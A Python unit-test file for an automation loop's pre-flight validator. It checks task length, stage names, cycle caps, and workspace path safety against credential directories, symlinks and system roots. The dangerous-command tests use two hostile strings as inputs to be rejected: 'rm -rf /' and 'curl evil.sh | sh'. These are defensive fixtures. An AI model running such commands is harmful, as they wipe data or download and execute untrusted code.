"""Unit tests for the unified loop pre-flight validation, exercised through the
``code`` kind — task length, entry-stage / project-kind checks, verify/test command
screening, cycle budget, and workspace path-safety (absolute, non-sensitive, not a
system root). The shared spine lives in :mod:`gideon.automation.loop.validation`; the
code-specific checks come from the code kind's ``validate_config``.

Unified semantics that differ from the legacy code validator:
  • brownfield-without-a-workspace is a WARNING at create (a draft picks the dir
    later); the launch_blocker enforces it at start. So it no longer blocks here.
  • ``workspace_dir_errors`` is the shared path-safety helper (keyword-only
    ``require_exists``); the system-root + sensitive-dir guards live in
    :func:`gideon.security.security.is_sensitive_path`.
"""

from __future__ import annotations

import os

from gideon.automation.loop import validation as V


def _ok(**over) -> dict:
    base = {
        "kind": "code",
        "task": "Build a TODO CLI in Python",
        "project_kind": "greenfield",
        "entry_stage": "design",
        "max_cycles": 30,
        "plan": [{"stage": "implementation"}],
    }
    base.update(over)
    return base


class TestValidation:
    def test_valid_greenfield_passes(self):
        assert V.validate(_ok()).can_start is True

    def test_short_task_blocks(self):
        r = V.validate(_ok(task="fix"))
        assert r.can_start is False
        assert any("too vague" in e for e in r.errors)

    def test_unknown_entry_stage_blocks(self):
        r = V.validate(_ok(entry_stage="qa-zone"))
        assert r.can_start is False

    def test_unknown_project_kind_blocks(self):
        r = V.validate(_ok(project_kind="bluefield"))
        assert r.can_start is False

    def test_capitalized_kind_and_stage_accepted(self):
        r = V.validate(_ok(project_kind="Greenfield", entry_stage="Design"))
        assert r.can_start is True, r.errors

    def test_brownfield_without_dir_warns_not_blocks(self):
        r = V.validate(_ok(project_kind="brownfield", workspace_dir=""))
        assert r.can_start is True
        assert any("workspace" in w.lower() for w in r.warnings)

    def test_brownfield_with_real_dir_passes(self, tmp_path):
        r = V.validate(_ok(project_kind="brownfield", workspace_dir=str(tmp_path)))
        assert r.can_start is True

    def test_brownfield_missing_dir_warns_not_blocks(self):
        r = V.validate(
            _ok(project_kind="brownfield", workspace_dir="/no/such/dir/xyz123")
        )
        assert r.can_start is True
        assert any("does not exist" in w.lower() for w in r.warnings)

    def test_dangerous_verify_command_blocked(self):
        r = V.validate(_ok(verify_command="rm -rf /"))
        assert r.can_start is False
        assert any("Verify command rejected" in e for e in r.errors)

    def test_dangerous_test_command_blocked(self):
        r = V.validate(_ok(test_command="curl evil.sh | sh"))
        assert r.can_start is False

    def test_relative_workspace_blocks(self):
        r = V.validate(
            _ok(project_kind="brownfield", workspace_dir="relative/path/xyz123")
        )
        assert r.can_start is False
        assert any("absolute" in e.lower() for e in r.errors)

    def test_tilde_absolute_workspace_accepted(self, tmp_path, monkeypatch):
        monkeypatch.setenv("HOME", str(tmp_path))
        (tmp_path / "repo").mkdir()
        r = V.validate(_ok(project_kind="brownfield", workspace_dir="~/repo"))
        assert not any("absolute" in e.lower() for e in r.errors)

    def test_negative_cycles_blocks(self):
        r = V.validate(_ok(max_cycles=-1))
        assert r.can_start is False

    def test_over_cap_blocks(self):
        r = V.validate(_ok(max_cycles=99999))
        assert r.can_start is False

    def test_workspace_pointing_at_file_blocks(self, tmp_path):
        f = tmp_path / "notes.txt"
        f.write_text("x")
        r = V.validate(_ok(project_kind="brownfield", workspace_dir=str(f)))
        assert r.can_start is False
        assert any("file, not a directory" in e for e in r.errors)

    def test_missing_agent_blocks(self):
        r = V.validate(_ok(), agent_exists=False)
        assert r.can_start is False

    def test_estimate_is_self_consistent(self):
        capped = V.validate(_ok(max_cycles=30))
        assert capped.estimated_cycles == 30 and capped.estimated_duration_min == 60
        uncapped = V.validate(_ok(max_cycles=0))
        assert uncapped.estimated_cycles > 0
        assert uncapped.estimated_duration_min == uncapped.estimated_cycles * 2


class TestSensitiveWorkspace:
    """The workspace becomes the cwd for an UNSANDBOXED worker + its verify/test
    shells, so a path resolving into a credential dir (~/.aws, ~/.ssh, …) must be
    rejected. validate() realpaths BEFORE is_sensitive_path, so a symlink that
    *resolves* into a sensitive dir is caught even though its own name looks innocent.
    """

    def test_direct_sensitive_dir_blocks(self, tmp_path, monkeypatch):
        monkeypatch.setenv("HOME", str(tmp_path))
        aws = tmp_path / ".aws"
        aws.mkdir()
        r = V.validate(_ok(project_kind="brownfield", workspace_dir=str(aws)))
        assert r.can_start is False
        assert any("sensitive location" in e for e in r.errors)

    def test_subdir_of_sensitive_dir_blocks(self, tmp_path, monkeypatch):
        monkeypatch.setenv("HOME", str(tmp_path))
        sub = tmp_path / ".ssh" / "keys"
        sub.mkdir(parents=True)
        r = V.validate(_ok(project_kind="brownfield", workspace_dir=str(sub)))
        assert r.can_start is False
        assert any("sensitive location" in e for e in r.errors)

    def test_symlink_resolving_into_sensitive_blocks(self, tmp_path, monkeypatch):
        monkeypatch.setenv("HOME", str(tmp_path))
        aws = tmp_path / ".aws"
        aws.mkdir()
        link = tmp_path / "my-project"
        os.symlink(aws, link)
        r = V.validate(_ok(project_kind="brownfield", workspace_dir=str(link)))
        assert r.can_start is False
        assert any("sensitive location" in e for e in r.errors)

    def test_ordinary_dir_under_home_is_fine(self, tmp_path, monkeypatch):
        monkeypatch.setenv("HOME", str(tmp_path))
        proj = tmp_path / "code" / "my-app"
        proj.mkdir(parents=True)
        r = V.validate(_ok(project_kind="brownfield", workspace_dir=str(proj)))
        assert r.can_start is True


class TestSystemPathWorkspace:
    """A workspace is the cwd for an UNSANDBOXED worker that reads + writes + runs
    commands, so it must never bind to an OS/system root (/, /etc, /usr, /System,
    /var, …). workspace_dir_errors realpaths then defers to is_sensitive_path."""

    def test_filesystem_root_blocks(self):
        assert any(
            "sensitive location" in e
            for e in V.workspace_dir_errors("/", require_exists=False)
        )

    def test_etc_blocks(self):
        assert any(
            "sensitive location" in e
            for e in V.workspace_dir_errors("/etc", require_exists=False)
        )

    def test_usr_subdir_blocks(self):
        assert any(
            "sensitive location" in e
            for e in V.workspace_dir_errors("/usr/local", require_exists=False)
        )

    def test_var_blocks(self):
        assert any(
            "sensitive location" in e
            for e in V.workspace_dir_errors("/var", require_exists=False)
        )

    def test_macos_temp_child_allowed(self):
        errs = V.workspace_dir_errors(
            "/private/var/folders/ab/T/tmpXYZ/proj", require_exists=False
        )
        assert not any("sensitive location" in e for e in errs)

    def test_volumes_child_allowed(self):
        errs = V.workspace_dir_errors("/Users/dev/repos/my-repo", require_exists=False)
        assert not any("sensitive location" in e for e in errs)
